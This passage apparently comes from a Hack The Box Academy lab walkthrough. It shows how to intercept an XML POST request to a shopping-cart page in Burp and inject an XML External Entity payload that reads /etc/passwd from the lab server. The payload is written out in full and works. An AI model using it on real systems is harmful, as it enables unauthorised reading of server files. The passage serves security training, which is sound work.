in http://shopdev2.inlanefreight.local/cart.php 
on `/cart.php` and click the `I AGREE` button so we can analyze the request in Burp. Looking at Burp, we see that a `POST` request is made with `XML` in the body like so:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
    <root>
     <subtotal>
      undefined
     </subtotal>
     <userid>
      1206
     </userid>
    </root>
```

Think back to the module content, namely the [Web Attacks](https://academy.hackthebox.com/module/134/section/1203) module; this looks like a good candidate for `XML External Entity (XXE) Injection` because the form seems to be sending data to the server in XML format. We try a few payloads and finally can achieve local file read to view the contents of the `/etc/passwd` file with this payload:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxetest;
	</userid>
</root>
```
